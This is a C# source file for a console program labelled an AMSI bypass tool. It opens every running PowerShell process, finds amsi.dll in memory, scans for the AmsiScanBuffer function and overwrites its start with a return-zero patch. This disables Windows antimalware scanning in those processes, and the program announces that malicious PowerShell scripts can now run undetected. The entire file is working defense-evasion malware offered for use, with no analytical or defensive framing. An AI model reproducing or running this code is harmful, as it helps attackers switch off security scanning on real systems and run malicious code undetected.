using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

class Program
{
    const uint PROCESS_ACCESS = 0x000F0000 | 0x00100000 | 0xFFFF;
    const uint PAGE_READWRITE = 0x40;
    const uint TH32CS_SNAPMODULE = 0x00000008;
    const int MAX_PATH = 260;
    const int MAX_MODULE_NAME32 = 255;

    [DllImport("kernel32.dll")]
    static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll")]
    static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, out int lpNumberOfBytesRead);

    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out int lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);

    [DllImport("kernel32.dll")]
    static extern bool Module32First(IntPtr hSnapshot, ref MODULEENTRY32 lpme);

    [DllImport("kernel32.dll")]
    static extern bool Module32Next(IntPtr hSnapshot, ref MODULEENTRY32 lpme);

    [DllImport("kernel32.dll")]
    static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll")]
    static extern uint GetLastError();

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
    public struct MODULEENTRY32
    {
        public uint dwSize;
        public uint th32ModuleID;
        public uint th32ProcessID;
        public uint GlblcntUsage;
        public uint ProccntUsage;
        public IntPtr modBaseAddr;
        public uint modBaseSize;
        public IntPtr hModule;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = MAX_MODULE_NAME32 + 1)]
        public string szModule;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = MAX_PATH)]
        public string szExePath;
    }

    static int[] GetPowershellPids()
    {
        var processes = Process.GetProcessesByName("powershell");
        var pids = new int[processes.Length];
        for (int i = 0; i < processes.Length; i++)
        {
            pids[i] = processes[i].Id;
        }
        return pids;
    }

    static IntPtr ReadBuffer(IntPtr handle, IntPtr baseAddress, byte[] amsiScanBuffer)
    {
        while (true)
        {
            byte[] buffer = new byte[amsiScanBuffer.Length];
            int bytesRead;
            
            if (ReadProcessMemory(handle, baseAddress, buffer, buffer.Length, out bytesRead))
            {
                if (ByteArrayEquals(buffer, amsiScanBuffer) || 
                    (buffer.Length >= 3 && buffer[0] == 0x29 && buffer[1] == 0xc0 && buffer[2] == 0xc3))
                {
                    return baseAddress;
                }
            }
            baseAddress = IntPtr.Add(baseAddress, 1);
        }
    }

    static bool ByteArrayEquals(byte[] a1, byte[] a2)
    {
        if (a1.Length != a2.Length) return false;
        for (int i = 0; i < a1.Length; i++)
        {
            if (a1[i] != a2[i]) return false;
        }
        return true;
    }

    static bool WriteBuffer(IntPtr handle, IntPtr address, byte[] buffer)
    {
        int bytesWritten;
        bool result = WriteProcessMemory(handle, address, buffer, buffer.Length, out bytesWritten);
        if (!result)
        {
            Console.WriteLine($"[-] WriteProcessMemory Error: {GetLastError()}");
        }
        return result;
    }

    static IntPtr GetAmsiScanBufferAddress(IntPtr handle, IntPtr baseAddress)
    {
        byte[] amsiScanBuffer = new byte[]
        {
            0x4c, 0x8b, 0xdc,           // mov r11,rsp
            0x49, 0x89, 0x5b, 0x08,     // mov qword ptr [r11+8],rbx
            0x49, 0x89, 0x6b, 0x10,     // mov qword ptr [r11+10h],rbp
            0x49, 0x89, 0x73, 0x18,     // mov qword ptr [r11+18h],rsi
            0x57,                       // push rdi
            0x41, 0x56,                 // push r14
            0x41, 0x57,                 // push r15
            0x48, 0x83, 0xec, 0x70      // sub rsp,70h
        };
        return ReadBuffer(handle, baseAddress, amsiScanBuffer);
    }

    static bool PatchAmsiScanBuffer(IntPtr handle, IntPtr funcAddress)
    {
        byte[] patchPayload = new byte[]
        {
            0x29, 0xc0,     // xor eax,eax
            0xc3            // ret
        };
        return WriteBuffer(handle, funcAddress, patchPayload);
    }

    static IntPtr GetAmsiDllBaseAddress(IntPtr handle, int pid)
    {
        MODULEENTRY32 me32 = new MODULEENTRY32();
        me32.dwSize = (uint)Marshal.SizeOf(typeof(MODULEENTRY32));
        
        IntPtr snapshotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, (uint)pid);
        bool ret = Module32First(snapshotHandle, ref me32);
        
        while (ret)
        {
            if (me32.szModule.Equals("amsi.dll", StringComparison.OrdinalIgnoreCase))
            {
                Console.WriteLine($"[+] Found base address of {me32.szModule}: 0x{me32.modBaseAddr.ToInt64():X}");
                CloseHandle(snapshotHandle);
                return GetAmsiScanBufferAddress(handle, me32.modBaseAddr);
            }
            ret = Module32Next(snapshotHandle, ref me32);
        }
        
        CloseHandle(snapshotHandle);
        return IntPtr.Zero;
    }

    static void Main(string[] args)
    {
        Console.ForegroundColor = ConsoleColor.Cyan;
        Console.WriteLine("===========================================");
        Console.WriteLine("       KILLER AMSI BYPASS TOOL");
        Console.WriteLine("===========================================");
        Console.ResetColor();
        Console.WriteLine();

        int[] pids = GetPowershellPids();
        
        if (pids.Length == 0)
        {
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("[!] No PowerShell processes found. Start PowerShell processes first:");
            Console.WriteLine("    Start-Process powershell");
            Console.ResetColor();
            return;
        }

        Console.WriteLine($"[*] Found {pids.Length} PowerShell process(es) to patch");
        Console.WriteLine();

        int successfulPatches = 0;
        
        foreach (int pid in pids)
        {
            IntPtr processHandle = OpenProcess(PROCESS_ACCESS, false, pid);
            if (processHandle == IntPtr.Zero)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"[-] Failed to open process {pid}");
                Console.ResetColor();
                continue;
            }
            
            Console.WriteLine($"[+] Got process handle of powershell at {pid}: 0x{processHandle.ToInt64():X}");
            Console.WriteLine($"[+] Trying to find AmsiScanBuffer in {pid} process memory...");
            
            IntPtr amsiDllBaseAddress = GetAmsiDllBaseAddress(processHandle, pid);
            if (amsiDllBaseAddress == IntPtr.Zero)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"[-] Error finding amsiDllBaseAddress in {pid}.");
                Console.WriteLine($"[-] Error: {GetLastError()}");
                Console.ResetColor();
                CloseHandle(processHandle);
                continue;
            }
            else
            {
                Console.WriteLine($"[+] Trying to patch AmsiScanBuffer found at 0x{amsiDllBaseAddress.ToInt64():X}");
                if (!PatchAmsiScanBuffer(processHandle, amsiDllBaseAddress))
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine($"[-] Error patching AmsiScanBuffer in {pid}.");
                    Console.WriteLine($"[-] Error: {GetLastError()}");
                    Console.ResetColor();
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine($"[+] Success patching AmsiScanBuffer in PID {pid}");
                    Console.WriteLine($"[+] AMSI BYPASSED for PowerShell process {pid}!");
                    Console.ResetColor();
                    successfulPatches++;
                }
            }
            
            CloseHandle(processHandle);
            Console.WriteLine();
        }

        // Final status report
        Console.ForegroundColor = ConsoleColor.Cyan;
        Console.WriteLine("===========================================");
        Console.WriteLine("           BYPASS OPERATION COMPLETE");
        Console.WriteLine("===========================================");
        Console.ResetColor();
        
        if (successfulPatches > 0)
        {
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine($"[+] Successfully bypassed AMSI in {successfulPatches} PowerShell process(es)");
            Console.WriteLine("[+] AMSI is now DISABLED in the patched processes");
            Console.WriteLine("[+] You can now execute malicious PowerShell scripts without detection");
            Console.ResetColor();
        }
        else
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("[-] No PowerShell processes were successfully patched");
            Console.WriteLine("[-] AMSI bypass FAILED");
            Console.ResetColor();
        }
        
        Console.WriteLine();
        Console.WriteLine("Press any key to exit...");
        Console.ReadKey();
    }
}
